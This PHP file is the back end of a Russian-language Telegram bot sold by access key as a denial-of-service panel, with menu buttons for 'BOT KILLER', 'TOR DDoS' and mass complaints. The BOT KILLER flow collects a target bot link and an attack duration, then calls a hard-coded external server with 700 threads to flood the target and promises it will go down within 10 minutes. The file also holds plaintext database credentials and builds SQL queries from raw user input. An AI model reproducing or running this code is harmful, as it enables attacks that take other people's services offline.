<?php
ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
include('./config.php');
$servername = "localhost";
$database = "ividivma_vot";
$username = "ividivma_vot";
$password = "6s97AR&y";
$tokens = "";


class DB {
    private static function connect() {
        $pdo = new PDO('mysql:host=127.0.0.1;dbname=ividivma_vot;charset=utf8mb4', 'root', 'root');
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    }
    public static function query($query, $params = array()) {
        $statement = self::connect()->prepare($query);
        $statement->execute($params);

        if (explode(' ', $query)[0] == 'SELECT') {
            $data = $statement->fetchAll();
            return $data;
        }
    }

}


if ($activate == '1')

{
    if ($message == '/menu')
    {
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id=5752672859&parse_mode=html&text={$txt}", "r");

        $method = 'sendMessage';
        $send_data = [
            'text' => 'Тыкни на кнопку для запуска атаки'
        ];
    }
    $arr = explode(' ', trim($message));

    if ($message === '/start') {
        $method = 'sendMessage';
        $send_data = [
            'text'         => str_replace("\\n","\n", 'Приветствуем!\nWeb-панель: текст\nПароль: <code>текст</code>'),
            'parse_mode' => 'HTML',
            'reply_markup' => [
                'resize_keyboard' => true,
                'keyboard'        => [
                    [
                        ['text' => 'BOT KILLER🔪'],
                        ['text' => '🌹 TOR DDoS'],
                        ['text' => '💫 Массовые жалобы'],
                        ['text' => '🌐 Добавить/изменить IP'],

                    ],
                ]
            ]
        ];
    }

    if ($message === '💫 Массовые жалобы' || $message === '🌹 TOR DDoS') {
        $method = 'sendMessage';
        $send_data = [
            'text'         => '🫤 Функция временно отключена',
        ];
    }
    if ($message === '🌐 Добавить/изменить IP') {
        $sqll = mysqli_query($bd, "UPDATE users SET command='changeip' WHERE user_id='$sid'");
        $method = 'sendMessage';
        $send_data = [
            'text'         => 'Введите новый IP',
            'reply_markup' => [
                'resize_keyboard' => true,
                'keyboard'        => [
                    [
                        ['text' => '☑️ Вернуться в главное меню'],

                    ],
                ]
            ]
        ];
    }


    if ($message != '↪️ Отмена' or !$message != '☑️ Вернуться в главное меню')
    {
        if ($command === 'changeip') {
            $tgsrv = $contentssss.', '.$message;
            $sqll = mysqli_query($bd, "UPDATE users SET tgservers='$tgsrv' WHERE user_id='$sid'");
            $method = 'sendMessage';
            $send_data = [
                'text'         => '👻 Правки успешно внесены',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [
                            ['text' => 'BOT KILLER🔪'],
                            ['text' => '🌹 TOR DDoS'],
                            ['text' => '💫 Массовые жалобы'],
                            ['text' => '🌐 Добавить/изменить IP'],


                        ],
                    ]
                ]

            ];
            $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
            $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
            $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
            $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
            $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");




        }
// ататка BOT KILLER🔪
        if ($message == 'BOT KILLER🔪')
        {
//$file_ids = "CAACAgIAAxkBAAEFF6xise5IJYvxE0P5sjk4EaJST6TzOAACjBoAAjnmkUn-4N7ZGg0DqSkE";
            //$send_stickers = fopen("https://api.telegram.org/bot{$tokens}/sendSticker?chat_id={$sid}&sticker={$file_ids}", "r");


            $result = mysqli_query($bd, "UPDATE users SET command='slotch' WHERE user_id='$sid'");
            $method = 'sendMessage';
            $send_data = [
                'text'         => 'Выбери желаемый слот',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [
                            ['text' => '1'],
                            ['text' => '2'],
                            ['text' => '3'],
                            ['text' => '4'],
                            ['text' => '5'],
                        ],
                        [
                            ['text' => '↪️ Отмена'],

                        ],
                    ]
                ]
            ];





        }

        if ($command == 'slotch')
        {
            if ($message !=  '↪️ Отмена' ) {
                $result = mysqli_query($bd, "UPDATE users SET slot='$message' WHERE user_id='$sid'");
                $method = 'sendMessage';
                $send_data = [
                    'text'         => 'Пришли ссылку bot https://t.me/botan_bot (Обязательно с http(s):// !!!)',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => '↪️ Отмена'],

                            ],
                        ]
                    ]
                ];

                $result = mysqli_query($bd, "UPDATE users SET command='link_tg' WHERE user_id='$sid'");
            } else {
                $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");


                $method = 'sendMessage';
                $send_data = [
                    'text'         => str_replace("\\n","\n", 'Приветствуем!\nWeb-панель: текст\nПароль: <code>текст</code>'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => 'BOT KILLER🔪'],
                                ['text' => '🌹 TOR DDoS'],
                                ['text' => '💫 Массовые жалобы'],
                                ['text' => '🌐 Добавить/изменить IP'],


                            ],
                        ]
                    ]
                ];


            }
        }

        if ($command == 'link_tg')
        {
            if ($message !=  '↪️ Отмена' ) {
                $result = mysqli_query($bd, "UPDATE users SET target='$message' WHERE user_id='$sid'");
                $method = 'sendMessage';
                $send_data = [
                    'text'         => 'Пришли желаемое время атаки в секундах',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => '↪️ Отмена'],

                            ],
                        ]
                    ]
                ];

                $result = mysqli_query($bd, "UPDATE users SET command='slotg' WHERE user_id='$sid'");
            } else {
                $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");


                $method = 'sendMessage';
                $send_data = [
                    'text'         => str_replace("\\n","\n", 'Приветствуем!\nWeb-панель: текст\nПароль: <code>текст</code>'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => 'BOT KILLER🔪'],
                                ['text' => '🌹 TOR DDoS'],
                                ['text' => '💫 Массовые жалобы'],
                                ['text' => '🌐 Добавить/изменить IP'],


                            ],
                        ]
                    ]
                ];


            }
        }

        if ($command == 'slotg')
            $result = mysqli_query($bd, "UPDATE users SET time='$message' WHERE user_id='$sid'");
        {


            if ($message >= '1')
            {


                file_put_contents('logfile.log', $message . $sid);

                $sql = "SELECT * FROM users WHERE user_id=$admin_id";
                $result = $bd->query($sql);
                if ($result->num_rows > 0)
                {
                    while ($row = $result->fetch_assoc())
                    {

                        $message_dos = $row["message"];
                        $method = $row["method"];
                        $command = $row["command"];
                        $target = $row["target"];
                        $thread = $row["thread"];
                        $time = $row["time"];
                        $contentssss = $row["tgservers"];

                    }

                }


                $servers = explode(", ", $contentssss);

                if ($message_dos == 'BOT') {
                    foreach ($servers as $server) {
                        $datae = DB::query('SELECT * FROM users WHERE id=100', array(':uid' => 1553833751))[0];
                        $thread = $datae['thread'];
                        $time = $datae['time'];
                        $target = $datae['target'];
                        $dat = file_get_contents('http://193.38.235.44:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//http_build_query($query));
                        $message_dos = '/start';
                    }
                }
                else
                {
                    if ($sid != $admin_id)
                    {
                        $txt = 'Юзер @' . $sun . ' ' . $sid . ' запустил атаку на ' . $time . ' секунд %0A %0A BOT: ' . $target . '%0A%0A Сервачки: ' . $contentssss;
                        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id={$admin_id}&parse_mode=html&text={$txt}", "r");
                    }
                }
                $sql = "SELECT * FROM users WHERE user_id=$admin_id";
                $result = $bd->query($sql);
                if ($result->num_rows > 0)
                {
                    while ($row = $result->fetch_assoc())
                    {

                        $message_dos = $row["message"];
                        $method = $row["method"];
                        $command = $row["command"];
                        $target = $row["target"];
                        $thread = $row["thread"];
                        $time = $row["time"];
                        $contentssss = $row["tgservers"];

                    }

                }
                if ($command == 'slotg') {
                    $dat = file_get_contents('http://193.38.235.44:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
                    $method = 'sendMessage';
                    /*$timenew = DB::query('SELECT time FROM users WHERE user_id=:id', array(':id'=>$admin_id))[0]['time'];
                    $targetnew = DB::query('SELECT target FROM users WHERE user_id=:id', array(':id'=>$admin_id))[0]['target'];*/
                    $send_data = [
                        'text'         => ' ' . $dat . '  ✅ Атака успешно запущена (бот упадет в течении 10 минут)' . chr(10) . chr(10) . '❗️ Цель: ' . $target  . chr(10) . '📮 Время атаки: ' . $message. ' sec.'   ,
                        'reply_markup' => [
                            'resize_keyboard' => true,
                            'keyboard'        => [
                                [
                                    ['text' => 'BOT KILLER🔪'],
                                    ['text' => '🌹 TOR DDoS'],
                                    ['text' => '💫 Массовые жалобы'],
                                    ['text' => '🌐 Добавить/изменить IP'],

                                ],
                            ]
                        ]

                    ];

                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");


                }
            }

        }
    }
    else
    {

        $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
        $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
        $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
        $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
        $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");


        $method = 'sendMessage';
        $send_data = [
            'text'         => str_replace("\\n","\n", 'Приветствуем!\nWeb-панель: текст\nПароль: <code>текст</code>'),
            'parse_mode' => 'HTML',
            'reply_markup' => [
                'resize_keyboard' => true,
                'keyboard'        => [
                    [
                        ['text' => 'BOT KILLER🔪'],
                        ['text' => '🌹 TOR DDoS'],
                        ['text' => '💫 Массовые жалобы'],
                        ['text' => '🌐 Добавить/изменить IP'],


                    ],
                ]
            ]
        ];
    }
}
else
{


// другие команды
    //Создание юзера, добавления и генерация ключей
    if ($message == '/start')
    {
        $randomChars = '0123456789abcdefghijklmnopqrstuvwxyz';
        $randKey = substr(str_shuffle($randomChars), 0, 15);

        $results = mysqli_query($bd, "SELECT id FROM users WHERE user_id='$sid'")->fetch_all();
        $myrow = mysqli_fetch_array($results);

        file_put_contents('logger.log', $myrow);

        if ($myrow['activate'] == 1)
        {
            $method = 'sendMessage';
            $send_data = [
                'text' => 'Вы уже авторизованы! Напишите /menu',
            ];
        }

        if (empty($myrow))
        {
            $sqll = mysqli_query($bd, "INSERT INTO users (user_id, name, command, userkey) VALUES ('$sid', '', 'auth', '{$randKey}')");
        }

        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id={$admin_id}&parse_mode=html&text={$txt}", "r");

        $method = 'sendMessage';
        $send_data = [
            'text' => '🔐 Для использования бота , введите ключ-доступа',
        ];
    }

    if ($message == '/menu')
    {
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id=5752672859&parse_mode=html&text={$txt}", "r");

        $method = 'sendMessage';
        $send_data = [
            'text' => 'Тыкни на кнопку для запуска атаки'
        ];
    }

    if ($message != '/start' && $message !== '/menu')
    {
        //send message handler
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id={$admin_id}&parse_mode=html&text={$txt}", "r");

        //checker
        $getUserForKey = mysqli_query($bd, "SELECT * FROM `users` WHERE `userkey` = '{$message}'")->fetch_all();

        if (!empty($getUserForKey))
        {
            mysqli_query($bd, "UPDATE `users` SET `activate` = 1  WHERE `userkey` = '{$message}'");

            $method = 'sendMessage';
            $send_data = [
                'text'         => str_replace("\\n","\n", 'Приветствуем!\nWeb-панель: текст\nПароль: <code>текст</code>'),
                'parse_mode' => 'HTML',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [
                            ['text' => 'BOT KILLER🔪'],
                            ['text' => '🌹 TOR DDoS'],
                            ['text' => '💫 Массовые жалобы'],
                            ['text' => '🌐 Добавить/изменить IP'],


                        ],
                    ]
                ]
            ];
        } else
        {
            $method = 'sendMessage';
            $send_data = [
                'text' => '❌ Вы ввели неверный ключ , попробуйте еще раз ! ',
            ];
        }
    }

}

$send_data['chat_id'] = $data['chat'] ['id'];
$res = sendTelegram($method, $send_data);

function sendTelegram($method, $data, $headers = [])
{
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_POST           => 1,
        CURLOPT_HEADER         => 0,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL            => 'https://api.telegram.org/bot' . TOKEN . '/' . $method,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => array_merge(["Content-Type: application/json"])
    ]);
    $result = curl_exec($curl);
    curl_close($curl);
    return (json_decode($result, 1) ? json_decode($result, 1) : $result);
}

?>